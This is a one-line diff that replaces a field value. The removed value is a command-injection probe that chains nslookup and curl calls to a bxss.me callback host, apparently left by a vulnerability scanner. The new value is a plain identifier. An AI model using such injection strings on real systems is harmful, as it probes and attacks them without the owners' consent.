@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitnmdsnxwveq6f725.bxss.me||curl hitnmdsnxwveq6f725.bxss.me)|(nslookup -q=cname hitnmdsnxwveq6f725.bxss.me||curl hitnmdsnxwveq6f725.bxss.me)&(nslookup -q=cname hitnmdsnxwveq6f725.bxss.me||curl hitnmdsnxwveq6f725.bxss.me)
+MO_537826574817_000/.
